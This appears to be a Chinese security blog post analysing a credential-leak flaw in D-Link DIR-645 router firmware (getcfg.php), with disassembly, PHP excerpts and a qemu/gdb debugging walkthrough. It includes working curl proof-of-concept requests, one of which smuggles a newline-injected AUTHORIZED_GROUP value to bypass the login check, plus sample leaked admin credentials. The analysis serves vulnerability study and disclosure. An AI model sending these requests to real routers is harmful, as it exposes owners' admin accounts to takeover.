---
layout: post
title:  "Dlink getcfg.php远程敏感信息读取漏洞分析"
date:   2019-10-06 21:00:00
categories: Vuln_Analysis IOT
permalink: /archivers/d-link-getcfg_php-info-leak
---

**欢迎关注公众号[平凡路上](https://mp.weixin.qq.com/s/TR-JuE2nl3W7ZmufAfpBZA)，平凡路上是一个致力于二进制漏洞分析与利用经验交流的公众号。**


这个漏洞似乎在Dlink很多的产品都存在，此次分析主要是针对dir-645，将该漏洞点从1.02到1.04都分析一遍。

## 漏洞描述

D-Link DIR 615/645/815是友讯（D-Link）公司的一款无线路由器产品。 出现问题的页面是`getcfg.php`，`1.02`及其之前，由于没有校验，可直接访问导致信息泄露；`1.02`之后，虽然有权限的检查，但是由于`cgibin`程序中代码逻辑出现了问题，导致可绕过校验，实现泄露。

## 漏洞复现

在[官网](ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.02.ZIP)下载固件，版本是1.02；1.03版本的[固件链接](ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP)以及1.04版本的[固件链接](ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.04.B11.ZIP)。

针对1.02版本固件的[poc代码](https://vuldb.com/?id.7843)如下：

```bash
curl -d SERVICES=DEVICE.ACCOUNT http://xx.xx.xx.xx/getcfg.php
```

可以看到成功获取admin账号与密码。

```bash
<uid>USR-</uid>
<name>admin</name>
<usrid></usrid>
<password>Haan1324</password>
```

![1.02-poc](https://raw.githubusercontent.com/ray-cp/ray-cp.github.io/master/_img/2019-10-06-d-link-getcfg_php-info-leak/1.02-poc.png)

1.03的poc代码

```bash
curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://xx.xx.xx.xx/getcfg.php"
```

可以看到，能成功获取帐号与密码（admin帐号为空口令）。

![1.03-poc](https://raw.githubusercontent.com/ray-cp/ray-cp.github.io/master/_img/2019-10-06-d-link-getcfg_php-info-leak/1.03-poc.png)

同时使用1.02的poc进行测试，看到返回的结果是未授权。

![1.03-fail](https://raw.githubusercontent.com/ray-cp/ray-cp.github.io/master/_img/2019-10-06-d-link-getcfg_php-info-leak/1.03-fail.png)

尝试在1.04上进行测试，也是可行，尝试在1.05、1.06上进行测试，仍然成功，这个洞在`dir-645`上面好像没有修补的感觉。

## 漏洞分析

上一步已经将固件下载下来了，用binwalk将固件解压。

首先对1.02版本的漏洞进行分析，根据poc：

```bash
curl -d SERVICES=DEVICE.ACCOUNT http://xx.xx.xx.xx/getcfg.php
```

直接访问的`getcfg.php`页面，文件在`/htdocs/web/getcfg.php`中。关键代码如下：

```php
$SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
    TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
    $SERVICE_INDEX = 0;
    while ($SERVICE_INDEX < $SERVICE_COUNT)
    {
        $GETCFG_SVC = cut($_POST["SERVICES"], $SERVICE_INDEX, ",");
        TRACE_debug("GETCFG: serivce[".$SERVICE_INDEX."] = ".$GETCFG_SVC);
        if ($GETCFG_SVC!="")
        {
            $file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";
            /* GETCFG_SVC will be passed to the child process. */
            if (isfile($file)=="1") dophp("load", $file);
        }
        $SERVICE_INDEX++;
    }
```

可以看到在没有经过任何的权限检查的情况下，程序直接获取`SERVICES`参数，并将其解析为`$GETCFG_SVC`变量，并最终拼接成`"/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php"`路径，直接调用`dophp("load", $file)`将文件读取出来，从而形成了文件包含漏洞。

至于包含啥文件，从poc里面可以看到此处包含的是`/htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php`，正是该php文件导致了帐号密码泄露。关键代码如下：

```php
foreach("/device/account/entry")
{
    if ($InDeX > $cnt) break;
    echo "\t\t\t<entry>\n";
    echo "\t\t\t\t<uid>".       get("x","uid"). "</uid>\n";
    echo "\t\t\t\t<name>".      get("x","name").    "</name>\n";
    echo "\t\t\t\t<usrid>".     get("x","usrid").   "</usrid>\n";
    echo "\t\t\t\t<password>".  get("x","password")."</password>\n";
    echo "\t\t\t\t<group>".     get("x", "group").  "</group>\n";
    echo "\t\t\t\t<description>".get("x","description")."</description>\n";
    echo "\t\t\t</entry>\n";
}
```

到这里1.02版本的信息泄露成因分析结束。

查看1.03版本之后的成因，根据poc，可以看到是在post数据中加入了`attack=ture%0aAUTHORIZED_GROUP=1`。

```bash
curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://xx.xx.xx.xx/getcfg.php"
```

首先分析之前的poc失败的原因，查看1.03版本文件系统中的`getcfg.php`，文件目录仍然是`/htdocs/web/getcfg.php`,关键代码如下：

```php
if(is_power_user() == 1)
    {
        /* cut_count() will return 0 when no or only one token. */
        $SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
        TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
        $SERVICE_INDEX = 0;
        while ($SERVICE_INDEX < $SERVICE_COUNT)
        {
            $GETCFG_SVC = cut($_POST["SERVICES"], $SERVICE_INDEX, ",");
            TRACE_debug("GETCFG: serivce[".$SERVICE_INDEX."] = ".$GETCFG_SVC);
            if ($GETCFG_SVC!="")
            {
                $file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";
                /* GETCFG_SVC will be passed to the child process. */
                if (isfile($file)=="1") dophp("load", $file);
            }
            $SERVICE_INDEX++;
        }
    }
    else
    {
        /* not a power user, return error message */
        echo "\t<result>FAILED</result>\n";
        echo "\t<message>Not authorized</message>\n";
    }
```

可以看到之前的poc失败应该是因为`is_power_user()`返回失败，所以导致输出未授权信息。

查看`is_power_user()`函数：

```php
function is_power_user()
{
    if($_GLOBALS["AUTHORIZED_GROUP"] == "")
    {
        return 0;
    }
    if($_GLOBALS["AUTHORIZED_GROUP"] < 0)
    {
        return 0;
    }
    return 1;
}
```

只有在`$_GLOBALS`数组中存在`AUTHORIZED_GROUP`变量才且该值大于等于0才会返回1，在php文件中搜索`AUTHORIZED_GROUP`字符，并没有看起来比较是和登录相关并对`AUTHORIZED_GROUP`赋值的页面，因此应该是在cgi中赋值。

相应php请求的代码为`usr/sbin/phpcgi`，它是一个指向`/htdocs/cgibin`的链接：

```bash
$ ls -al ./usr/sbin/phpcgi

lrwxrwxrwx 1 raycp raycp 14 Jul  9 01:33 ./usr/sbin/phpcgi -> /htdocs/cgibin
```

因此去看`/htdocs/cgibin`文件：

```bash
$ file ./htdocs/cgibin
./htdocs/cgibin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped
```

该文件是小端的mips 32程序，把它拖到ida里面，为了能看反编译代码，也将其拖到ghidra里面。同时为了有对比，也将1.02版本中的`/htdocs/cgibin`拖到ida以及ghidra里面进行对比分析。

main函数主要是一个函数分发，不同的cgi名称对应不同的处理函数，可以看到`phpcgi`对应的是`phpcgi_main`处理流程。

![1.03-cgi-main](https://raw.githubusercontent.com/ray-cp/ray-cp.github.io/master/_img/2019-10-06-d-link-getcfg_php-info-leak/1.03-cgi-main.png)

跟进去`phpcgi_main`函数，可以看到它用sobj_xxx系列函数来处理字符串，在网上找到了[源码](https://github.com/patrick-ken/MyNet_N900/blob/master/elbox_WRGND15/comlib/strobj.c)，可以进行参考，方便分析。

![1.03-phpcgimain](https://raw.githubusercontent.com/ray-cp/ray-cp.github.io/master/_img/2019-10-06-d-link-getcfg_php-info-leak/1.03-phpcgimain.png)

可以看到phpcgimain中最主要的工作是对请求参数、请求头进行解析，然后将执行权交给 php。

首先判断请求的方式是`HEAD`或`GET`，如果是的话则后续处理参数的函数则为`GetKeyValue`；如果为`POST`则后续处理参数的函数则为`PostKeyValue`，接着调用`cgibin_parse_request`。

该函数首先会判断传入的url中是否存在问号来判断请求方式，如果存在问号则直接将调用相应的函数处理方式`GetKeyValue`或`PostKeyValue`（感觉这样的判断是有问题的）。

如果为post则通过比对`CONTENT_TYPE`来找到相应的类型处理函数进行判断，并最终调用`PostKeyValue`。

因为poc中是post请求，因此主要看下`PostKeyValue`，对于每对传入的参数都会按照以键值对的形式（ `_TYPE_KEY=VALUE` ，TYPE 为 GET、POST、SERVER等），并以 `\n` 分隔储存到一字符串中。

![1.03-post-key-value](https://raw.githubusercontent.com/ray-cp/ray-cp.github.io/master/_img/2019-10-06-d-link-getcfg_php-info-leak/1.03-post-key-value.png)

对请求处理完成后，所有的参数都会以以键值对的形式，并以 `\n` 分隔储存到字符串中。

接着就是对用户权限进行验证，关键代码如下，程序调用了`sess_validate`来对session进行判断，最后的返回值以格式化字符串的形式保存到`AUTHORIZED_GROUP=%d`中，即这里就是产生`AUTHORIZED_GROUP`的地方，并也是在字符串最后加入了一个`\n`符，拼接到前面的字符串中。

![1.03-authrize-check](https://raw.githubusercontent.com/ray-cp/ray-cp.github.io/master/_img/2019-10-06-d-link-getcfg_php-info-leak/1.03-authrize-check.png)

然后调用`sobj_get_string`获取字符串后，调用`xmldbc_ephp`去最终执行php，`xmldb client`的[源码](https://github.com/coolshou/DIR-850L_A1/blob/master/comlib/libxmldbc.c)也在网上找到了，有需要的可以看看。

到这里就可以比较直观的看到问题所在，传入的参数以键值对的形式保存在`sobj`结构体里（其实就是字符串），并以`\n`符分割，同时权限验证的返回值也以键值对的形式保存在该结构体中以换行符分割，并且参数中的值比后面权限的验证值还在字符串的前面一些。

若我们传入的参数中包含`AUTHORIZED_GROUP=0`，由于参数解析的时候会加入一个类型最终变成`_POST_AUTHORIZED_GROUP=0`，因此无法绕过检查。但是由于参数解析的时候是使用`&`分割，但是字符串又以`\n`分割，因此若我们在参数中加入`\n`，因此可以绕过检查。如传入`a=b\nAUTHORIZED_GROUP=0`，最终经过处理后会变成字复还`_POST_a=b\nAUTHORIZED_GROUP=0`，导致解析出来了`AUTHORIZED_GROUP=0`，从而得以绕过后续页面的验证，实现未授权访问，导致信息泄露。

### 动态验证

觉得对于后续的这个cgibin有进一步调试验证的需要以帮助理解该漏洞。

使用qemu用户模式来进行调试，调试脚本为`cgi_run_phpcgi.sh`，用命令`sudo ./cgi_run_phpcgi.sh`使用qemu运行`cgibin`，并监听端口`1234`，bash脚本内容如下：

```bash
#!/bin/bash
# sudo ./cgi_run.sh

INPUT=`python -c "print 'SERVICES=DEVICE.ACCOUNT&attack=ture\nAUTHORIZED_GROUP=1'"`

LEN=$(echo $INPUT | wc -c)
PORT="1234"

if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
    echo -e "\nusage: sudo $0\n"
    exit 1
fi

cp $(which qemu-mipsel-static) ./qemu

echo "$INPUT"  | chroot .  ./qemu  -0 "/phpcgi" -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded"  -E REQUEST_METHOD="POST"  -E REQUEST_URI="/getcfg.php" -E REMOTE_ADDR="127.0.0.1" -g $PORT ./htdocs/cgibin "/phpcgi" "/phpcgi"#2>/dev/null
echo "run ok"
rm -f ./qemu
```

脚本中需要说明的两点是使用`-0`指定第一次参数为`/phpcgi`，因为cgibin中判断cgi名称的为第一个参数，其次是`CONTENT_TYPE`为`application/x-www-form-urlencoded`，因为它在处理post参数时有比对`CONTENT_TYPE`，不同的type有不同的处理函数，使用`application/x-www-form-urlencoded`会方便一些。

程序运行起来后，使用gdb-multiarch调试cgibin，命令为`gdb-multiarch ./htdocs/cgibin`。有可能会因为gdb中存在bug导致调试出问题，此时可以尝试自己编译新版本的gdb来进行调试，将所有架构支持都添加进去（虽然最后pwndbg可能会报错，但是至少可以调试了），还有就是也可以使用ida调试，我这里是自己编译了个gdb进行调试，编译命令是（需要制定python3的目录）：

```bash
wget https://ftp.gnu.org/gnu/gdb/gdb-8.2.1.tar.gz
tar -xvf gdb-8.2.1.tar.gz
cd gdb-8.2.1
mkdir build
cd build
../configure --prefix=/usr --disable-nls --disable-werror --with-system-readline --with-python=/usr/bin/python3.6 --with-system-gdbinit=/etc/gdb/gdbinit --enable-targets=all
make -j7
sudo make install
```

同时想要卸载自己编译的gdb不能简单的`make uninstall`，根据[文章](https://nanxiao.me/how-to-uninstall-gdb？/)，需要进入每个子目录，分别执行`make uninstall`命令。

```
A clumsy workaround is to cd into each subdir in the build tree and do
make uninstall there.
```

最后开始之前再说明下`strobj`[结构体](https://github.com/patrick-ken/MyNet_N900/blob/master/elbox_WRGND15/comlib/strobj.c)，`sobj_add_string`以及`sobj_add_char`都是将字符串添加到结构体的`buff`中。

```c
struct strobj
{
    struct dlist_head list;
    unsigned int flags;
    size_t total;   /* allocated size, not including the terminated NULL. */
    size_t size;    /* used size, not including the terminated NULL. */
    char * buff;    /* pointer to the buffer */
};

struct strobj_list
{
    struct dlist_head head;
    struct strobj * curr;
};
```

进入gdb调试，将断点下在`phpcgi_main`中的调用`cgibin_parse_request`处（0x405a00）。查看此时的`strobj`结构体。

```c
(gdb) x/10wx 0x00435008
0x435008:       0x00435008      0x00435008      0x00000000      0x000008e0
0x435018:       0x000008c3      0x00435028      0x00000000      0x000008e9
0x435028:       0x7068702f      0x0a696763
```

可以看到此时的`buff`大小为`0x8e0`，已使用`0x8c3`，地址为`0x00435028`，字符串中的内容为：

```c
(gdb) x/s 0x00435028
0x435028:       "/phpcgi\n_SERVER_REMOTE_ADDR=127.0.0.1\n_SERVER_REQUEST_URI=/getcfg.php\n_SERVER_REQUEST_METHOD=POST\n_SERVER_CONTENT_TYPE=application/x-www-form-urlencoded\n_SERVER_CONTENT_LENGTH=55\n_SERVER__=/usr/sbin/c"...
```

单步执行，执行完`cgibin_parse_request`函数后，查看该结构体：

```c
(gdb) x/10wx 0x00435008
0x435008:       0x00435008      0x00435008      0x00000000      0x00000920
0x435018:       0x00000907      0x004359e8      0x00000000      0x000008e9
0x435028:       0x7f7ab654      0x7f7ab654
```

因为`realloc`调整堆的原因，`buff`地址已经变成了`0x004359e8 `，此时已使用大小为`0x00000907`，查看新添加进去的post参数的内容：

```c
(gdb) x/s 0x004359e8+0x8c3
0x4362ab:       "_POST_SERVICES=DEVICE.ACCOUNT\n_POST_attack=ture\nAUTHORIZED_GROUP=1\n\n"
```

可以看到正如分析的一样，参数是以键值对的形式存储，以换行符分割，且会在键值前面加入`_TYPE_`。因此可以在参数中伪造换行符实现字符串的构造，可以看到此时也伪造了`AUTHORIZED_GROUP=1`进去。

接着一直运行，直到运行至`session`判断完毕，即将真正的`AUTHORIZED_GROUP`添加到结构体中的部分。断点下在最后的`sobj_get_string`处（0x405b6c），查看结构体：

```c
(gdb) x/10wx 0x00435008
0x435008:       0x00435008      0x00435008      0x00000000      0x00000920
0x435018:       0x00000907      0x004359e8      0x00000000      0x000008e9
0x435028:       0x7f7ab654      0x7f7ab654
```

查看post参数之后的字符串：

```c
0x00405b6c in phpcgi_main ()
(gdb) x/s 0x004359e8+0x8c3
0x4362ab:       "_POST_SERVICES=DEVICE.ACCOUNT\n_POST_attack=ture\nAUTHORIZED_GROUP=1\n\nAUTHORIZED_GROUP=-1\nSESSION_UID=\n"
```

可以看到此时加入的正是`AUTHORIZED_GROUP=-1`，但是由于前面已经插入了一个`AUTHORIZED_GROUP=1`，导致了后面php对`AUTHORIZED_GROUP`的认证绕过，从而实现非授权的敏感信息的读取。

## 小结

除了`getcfg.php`之外，该固件中的`htdocs/webinc/fatlady.php`也可以形成信息泄露，原理一致。

对于漏洞来说，千里之堤，溃于蚁穴。对于自己，还是要注意细节，多看看学。

相关文件与脚本链接[github](https://github.com/ray-cp/Vuln_Analysis/tree/master/D-Link-dir-645-rce)

## 参考链接

1. [D-LINK DIR-645 FIRMWARE 1.02 AUTHENTICATION /GETCFG.PHP SERVICES INFORMATION DISCLOSURE](https://vuldb.com/?id.7843)
2. [D-Link 850L&645路由漏洞分析](https://xz.aliyun.com/t/2941#toc-4)
3. [D-Link Routers 110/412/615/815 Arbitrary Code Execution](https://packetstormsecurity.com/files/145859/dlinkroutersservice-exec.txt)
4. [路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析](https://www.anquanke.com/post/id/175625)
5. [关于D-Link DIR 8xx漏洞分析](http://www.qingpingshan.com/pc/aq/330349.html)
6. [strobj 系列函数相关源码](https://github.com/patrick-ken/MyNet_N900/blob/master/elbox_WRGND15/comlib/strobj.c)
7. [dlink_auth_rce](https://github.com/ChiefyChief/dlink_shell_poc/blob/master/dlink_auth_rce)
8. [xmldb client相关源码](https://github.com/coolshou/DIR-850L_A1/blob/master/comlib/libxmldbc.c)

文章先发于[先知](https://xz.aliyun.com/t/6453)社区。

